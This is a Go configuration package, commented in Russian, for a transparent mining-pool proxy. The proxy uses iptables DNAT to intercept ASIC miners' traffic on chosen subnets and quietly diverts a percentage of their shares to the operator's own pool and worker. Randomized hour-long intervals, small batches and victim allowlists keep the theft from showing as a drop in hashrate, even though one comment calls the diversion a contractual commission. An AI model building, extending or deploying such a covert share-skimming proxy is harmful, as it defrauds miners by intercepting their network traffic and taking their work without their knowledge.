// Пакет config отвечает за чтение и валидацию YAML-конфигурации.
//
// Конфиг — единственный источник правды для прокси: адрес слушающего порта,
// реальный и целевой пулы, процент кражи, интервалы, подсети для iptables.
// Если поля не заданы — применяются безопасные значения по умолчанию.
package config

import (
	"fmt"
	"io/ioutil"
	"math"
	"net"
	"strconv"
	"time"

	"gopkg.in/yaml.v3"
)

// StealTo описывает целевой пул и воркер, на которого будем перенаправлять
// «укушенные» шары (это и есть наша комиссия по договору с клиентом).
type StealTo struct {
	// Pool адрес целевого пула в формате host:port.
	Pool string `yaml:"pool"`

	// Worker имя воркера, под которым шары придут на целевой пул.
	Worker string `yaml:"worker"`

	// Pass пароль воркера (большинство пулов принимают "x").
	Pass string `yaml:"pass"`

	// SSL использовать ли TLS-соединение к целевому пулу (ssl://).
	SSL bool `yaml:"ssl"`
}

// StealRule — одно правило allowlist (этап 4): кого «кусать».
type StealRule struct {
	// Pool адрес пула (IP:port или host:port). Удобно копировать из поля
	// discovery эндпоинта /status. Обязателен.
	Pool string `yaml:"pool"`

	// Worker воркер на этом пуле. Пустая строка = все воркеры пула.
	Worker string `yaml:"worker"`
}

// Config основная структура конфигурации приложения.
// Поля маппятся на ключи YAML-файла при помощи тегов yaml:"...".
type Config struct {
	// ListenAddr адрес и порт, на котором слушает прокси (сюда попадает
	// трафик после DNAT). Дефолт "0.0.0.0:8443".
	ListenAddr string `yaml:"listen_addr"`

	// UpstreamPool адрес реального майнинг-пула в формате host:port.
	// Клиентский ASIC майнит в этот пул (например viabtc.com:3333).
	UpstreamPool string `yaml:"upstream_pool"`

	// UpstreamSSL использовать ли TLS при подключении к upstream пулу
	// (некоторые пулы принимают только ssl:// трафик).
	UpstreamSSL bool `yaml:"upstream_ssl"`

	// StealTo конфигурация целевого пула для перенаправления шар.
	StealTo StealTo `yaml:"steal_to"`

	// Percentage процент шар для перенаправления. Диапазон 0.1–100.
	// Пример: 5 означает, что ~5% выполненных шар уйдёт на наш воркер.
	Percentage float64 `yaml:"percentage"`

	// IntervalMinHours минимальный интервал (в часах) между циклами кражи.
	// Служит для того, чтобы пул не пересоздавал соединение и не было
	// сброса хешрейта. Дефолт 2.
	IntervalMinHours float64 `yaml:"interval_min_hours"`

	// IntervalMaxHours максимальный интервал (в часах) между циклами кражи.
	// Фактический интервал каждого следующего цикла выбирается случайно
	// в диапазоне [IntervalMinHours, IntervalMaxHours]. Дефолт 20.
	IntervalMaxHours float64 `yaml:"interval_max_hours"`

	// BatchSize количество шар, перенаправляемых за один активный цикл
	// кражи. Ограничение заказчика: нельзя таскать шары подряд долго —
	// поэтому batch должен быть небольшим (по умолчанию 1).
	BatchSize int `yaml:"batch_size"`

	// PauseShares включает режим «паузы в шарах»: кусать 1 шару каждые
	// ~100/percentage шар. В этом режиме процент достигается ТОЧНО и не
	// зависит от скорости потока. По умолчанию false (режим паузы по
	// времени через interval_min/max_hours).
	PauseShares bool `yaml:"pause_shares"`

	// TargetTimeoutSec время ожидания ответа (accept) от целевого пула на
	// перенаправленную шару, в секундах. Если пул молчит дольше — шару
	// считаем потерянной (failover), соединение сбрасывается. Дефолт 30.
	TargetTimeoutSec int `yaml:"target_timeout_sec"`

	// AllowedSubnets список подсетей (CIDR), трафик которых разрешено
	// перенаправлять на прокси через iptables. Остальной трафик не трогаем.
	AllowedSubnets []string `yaml:"allowed_subnets"`

	// SetupIPTables если true — при запуске автоматически настроить iptables
	// (DNAT) под разрешённые подсети. Требует права root.
	SetupIPTables bool `yaml:"setup_iptables"`

	// MonitorAddr адрес HTTP-сервера мониторинга (/status, /health).
	// Пустая строка отключает мониторинг. Дефолт "127.0.0.1:9090".
	MonitorAddr string `yaml:"monitor_addr"`

	// Transparent включает прозрачный режим: реальный адресат каждого
	// соединения берётся из iptables DNAT (SO_ORIGINAL_DST), а не из одного
	// upstream_pool. В одной подсети у разных клиентов могут быть разные
	// пулы (viabtc/ampool/hairpool или голый IP:port) — прозрачный режим
	// ходит в настоящий пул конкретного клиента. По умолчанию true.
	// Указатель (*bool), чтобы отличать «не задано» от явного false.
	Transparent *bool `yaml:"transparent"`

	// CaptureAllTCP если true — iptables перенаправляет на прокси ВЕСЬ
	// TCP-трафик разрешённых подсетей (без фильтра по порту пула). Нужно,
	// когда клиенты используют разные порты пулов, в т.ч. IP:port при
	// DNS-блокировках. По умолчанию false: правится только порт upstream.
	CaptureAllTCP bool `yaml:"capture_all_tcp"`

	// StealRules — allowlist пар (пул, воркер) для кражи (этап 4).
	// Пусто = кусать у всех (обратная совместимость со старой логикой).
	// Если задан хотя бы один элемент — кусаются только совпавшие пары,
	// всё остальное проксируется сквозняком (без кражи).
	StealRules []StealRule `yaml:"steal_rules"`

	// UpstreamPort порт реального пула — производное поле, извлекается из
	// UpstreamPool при загрузке. Нужно для DNAT-правил (--dport <порт пула>).
	// Тег yaml:"-" означает, что поле не маппится из YAML.
	UpstreamPort string `yaml:"-"`
}

// TransparentOn возвращает значение transparent с дефолтом true, если в
// конфиге поле не задано (nil).
func (c *Config) TransparentOn() bool {
	if c.Transparent == nil {
		return true
	}
	return *c.Transparent
}

// ParseUpstream извлекает хост и порт из адреса пула (формат host:port).
// Ищем последний символ ':' с конца строки — это разделитель порта,
// так как домен может содержать порт только один раз.
func (c *Config) ParseUpstream() (host, port string, err error) {
	for i := len(c.UpstreamPool) - 1; i >= 0; i-- {
		if c.UpstreamPool[i] == ':' {
			return c.UpstreamPool[:i], c.UpstreamPool[i+1:], nil
		}
	}
	return "", "", fmt.Errorf("invalid upstream pool address: %s", c.UpstreamPool)
}

// IntervalMin возвращает минимальный интервал кражи как time.Duration.
// Переводим часы (float) в длительность через умножение на время часа.
func (c *Config) IntervalMin() time.Duration {
	return time.Duration(c.IntervalMinHours * float64(time.Hour))
}

// IntervalMax возвращает максимальный интервал кражи как time.Duration.
func (c *Config) IntervalMax() time.Duration {
	return time.Duration(c.IntervalMaxHours * float64(time.Hour))
}

// validHostPort проверяет, что строка имеет вид host:port и порт числовой
// в диапазоне 1–65535. Нужно для валидации ListenAddr и адресов пулов.
func validHostPort(addr, field string) (err error) {
	_, port, err := net.SplitHostPort(addr)
	if err != nil {
		return fmt.Errorf("invalid %s %q: %w", field, addr, err)
	}
	p, err := strconv.Atoi(port)
	if err != nil {
		return fmt.Errorf("invalid port in %s %q: %w", field, addr, err)
	}
	if p < 1 || p > 65535 {
		return fmt.Errorf("port out of range in %s %q: %d", field, addr, p)
	}
	return nil
}

// Load читает YAML-файл, парсит его в Config, применяет значения по умолчанию
// и проверяет обязательные поля. Возвращает заполненный конфиг или ошибку.
func Load(path string) (*Config, error) {
	// Читаем файл целиком в память.
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read config: %w", err)
	}

	// Парсим YAML в структуру. Неизвестные ключи игнорируются.
	var cfg Config
	if err := yaml.Unmarshal(data, &cfg); err != nil {
		return nil, fmt.Errorf("parse config: %w", err)
	}

	// --- Значения по умолчанию для необязательных полей ---
	if cfg.ListenAddr == "" {
		cfg.ListenAddr = "0.0.0.0:8443"
	}
	// Процент должен лежать в 0.1–100 и быть конечным числом; иначе берём дефолт 5.
	if math.IsNaN(cfg.Percentage) || math.IsInf(cfg.Percentage, 0) ||
		cfg.Percentage < 0.1 || cfg.Percentage > 100 {
		cfg.Percentage = 5.0
	}
	// Интервал может быть дробным и малым (например 0.01 часа ≈ 36 секунд) —
	// удобно для локального тестирования. Дефолт 2 применяется только если
	// поле вообще не задано (<= 0).
	if cfg.IntervalMinHours <= 0 {
		cfg.IntervalMinHours = 2
	}
	if cfg.IntervalMaxHours <= 0 {
		cfg.IntervalMaxHours = 20
	}
	// Если min > max — меняем местами (иначе случайный интервал некорректен).
	if cfg.IntervalMinHours > cfg.IntervalMaxHours {
		cfg.IntervalMinHours, cfg.IntervalMaxHours = cfg.IntervalMaxHours, cfg.IntervalMinHours
	}
	if cfg.BatchSize < 1 {
		cfg.BatchSize = 1
	}
	if cfg.TargetTimeoutSec <= 0 {
		cfg.TargetTimeoutSec = 30
	}
	if cfg.MonitorAddr == "" {
		cfg.MonitorAddr = "127.0.0.1:9090"
	}

	// --- Валидация числовых портов ---
	if err := validHostPort(cfg.ListenAddr, "listen_addr"); err != nil {
		return nil, err
	}

	// --- Валидация CIDR подсетей ---
	for _, sn := range cfg.AllowedSubnets {
		if _, _, err := net.ParseCIDR(sn); err != nil {
			return nil, fmt.Errorf("invalid CIDR in allowed_subnets %q: %w", sn, err)
		}
	}

	// --- Валидация правил кражи (allowlist) ---
	// Пул обязателен и должен быть host:port; воркер опционален.
	for i, rule := range cfg.StealRules {
		if rule.Pool == "" {
			return nil, fmt.Errorf("steal_rules[%d].pool is required", i)
		}
		if err := validHostPort(rule.Pool, fmt.Sprintf("steal_rules[%d].pool", i)); err != nil {
			return nil, err
		}
	}

	// --- Обязательные поля ---
	// Без реального пула нечего прозрачно проксировать.
	if cfg.UpstreamPool == "" {
		return nil, fmt.Errorf("upstream_pool is required")
	}
	// Без целевого пула и воркера некуда «сливать» шары.
	if cfg.StealTo.Pool == "" {
		return nil, fmt.Errorf("steal_to.pool is required")
	}
	if cfg.StealTo.Worker == "" {
		return nil, fmt.Errorf("steal_to.worker is required")
	}

	// --- Производное поле: порт upstream пула + валидация портов пулов ---
	// Он понадобится iptables: DNAT только для трафика, идущего на --dport
	// этого порта (например 3333), чтобы не задевать DNS/NTP/DHCP.
	_, port, err := cfg.ParseUpstream()
	if err != nil {
		return nil, err
	}
	if err := validHostPort(cfg.UpstreamPool, "upstream_pool"); err != nil {
		return nil, err
	}
	if err := validHostPort(cfg.StealTo.Pool, "steal_to.pool"); err != nil {
		return nil, err
	}
	cfg.UpstreamPort = port

	return &cfg, nil
}
